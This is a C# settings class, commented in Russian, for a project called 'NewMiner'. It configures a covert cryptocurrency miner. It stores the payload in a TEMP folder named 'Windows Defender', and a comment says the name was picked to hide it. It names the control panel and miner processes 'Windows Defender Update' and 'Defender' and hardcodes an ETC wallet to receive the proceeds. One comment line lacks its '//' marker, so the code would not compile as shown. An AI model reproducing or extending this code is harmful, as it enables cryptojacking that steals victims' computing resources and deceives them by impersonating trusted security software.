using System.IO;

namespace NewMiner
{
    internal class Settings
    {
        public static readonly string Temp = Path.GetTempPath(); //Находим папку TEMP
        public static readonly string GenDir = Path.Combine(Temp, "Windows Defender"); Главная папка для всего(название специально для скрытия)
        public static readonly string Hwid_Path = Path.Combine(GenDir, "hwid.txt"); //Не помню для чего это прописывал. В коде вроде нет этого.

        //Настройки панели
        public static readonly string panelProc = "Windows Defender Update"; //Название панели
        public static string panelPath = Path.Combine(GenDir, $"{panelProc}.exe"); //расположение панели при дропе

        //Настройка майнера
        public static readonly string minerProc = "Defender"; //Название майнера
        public static string minerPath = Path.Combine(GenDir, $"{minerProc}.exe"); //Расположение майнера

        //Настройки кошелька
        public static readonly string wallet = "0x45373749952c1744628f9353C05E38c7a32005f4"; //Вот здесь должен быть кошелек. только кошелек ETC и все. он начинается с 0x
    }
}